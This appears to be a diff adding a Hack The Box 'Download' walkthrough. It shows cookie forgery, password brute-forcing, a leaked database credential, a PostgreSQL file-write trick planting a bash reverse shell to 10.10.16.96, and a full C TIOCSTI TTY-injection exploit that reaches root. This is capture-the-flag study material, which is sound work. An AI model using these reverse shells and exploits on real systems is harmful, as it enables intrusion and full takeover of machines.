@@ -175,3 +175,111 @@ app.listen(port, process.env.NODE_ENV === "production" ? "127.0.0.1" : "0.0.0.0"
   });
 
 - https://github.com/DigitalInterruption/cookie-monster
+- created a cookie.json for the cookie-monster:
+    {"user":{"username":{"contains": "WESLEY"}, "password":{"startsWith":"a"}}}
+- created cookie_password.py to brute force the password
+- solved the hash with crackstation, got wesley's password
+
+┌─[xbutch@parrot]─[~/HTB/Download]
+└──╼ $ssh wesley@download.htb
+wesley@download.htb's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-155-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+ System information disabled due to load higher than 2.0
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Wed Aug  9 20:10:45 2023 from 10.10.16.96
+wesley@download:~$ cat user.txt
+********************************
+
+- linpeas
+
+wesley@download:~$ cat /etc/systemd/system/download-site.service
+[Unit]
+Description=Download.HTB Web Application
+After=network.target
+
+[Service]
+Type=simple
+User=www-data
+WorkingDirectory=/var/www/app/
+ExecStart=/usr/bin/node app.js
+Restart=on-failure
+Environment=NODE_ENV=production
+Environment=DATABASE_URL="postgresql://download:*****************@localhost:5432/download"
+
+[Install]
+WantedBy=multi-user.target
+wesley@download:~$ psql -h localhost -p 5432 -U download
+Password for user download: 
+psql (12.15 (Ubuntu 12.15-0ubuntu0.20.04.1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+Type "help" for help.
+
+download=> \du
+                                          List of roles
+ Role name |                         Attributes                         |        Member of        
+-----------+------------------------------------------------------------+-------------------------
+ download  |                                                            | {pg_write_server_files}
+ postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS | {}
+
+download=> COPY (SELECT CAST('bash -i >& /dev/tcp/10.10.16.96/8888 0>&1' AS text)) TO '/var/lib/postgresql/.bash_profile';
+
+┌─[xbutch@parrot]─[~/tools]
+└──╼ $nc -nvlp 8888
+listening on [any] 8888 ...
+connect to [10.10.16.96] from (UNKNOWN) [10.10.11.226] 57896
+postgres@download:~$ 
+
+https://ruderich.org/simon/notes/su-sudo-from-root-tty-hijacking
+
+- created a TTY_exploit.c:
+  GNU nano 5.4                                             TTY_exploit.c                                               I      
+#include <fcntl.h>
+#include <stdio.h>
+#include <string.h>
+#include <sys/ioctl.h>
+int main() {
+    int fd = open("/dev/tty", O_RDWR);
+    if (fd < 0) {
+        perror("open");
+        return -1;
+    }
+    char *x = "exit\n/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.96/8888 0>&1'\n";
+    while (*x != 0) {
+        int ret = ioctl(fd, TIOCSTI, x);
+        if (ret == -1) {
+            perror("ioctl()");
+        }
+        x++;
+    }
+    return 0;
+}
+
+
+COPY (SELECT CAST('/tmp/TTY_exploit' AS text)) TO '/var/lib/postgresql/.bash_profile';
+
+┌─[xbutch@parrot]─[~/HTB/Download]
+└──╼ $nc -nlvp 8888
+listening on [any] 8888 ...
+connect to [10.10.16.96] from (UNKNOWN) [10.10.11.226] 38714
+root@download:~# cat /root/root.txt
+cat /root/root.txt
+********************************
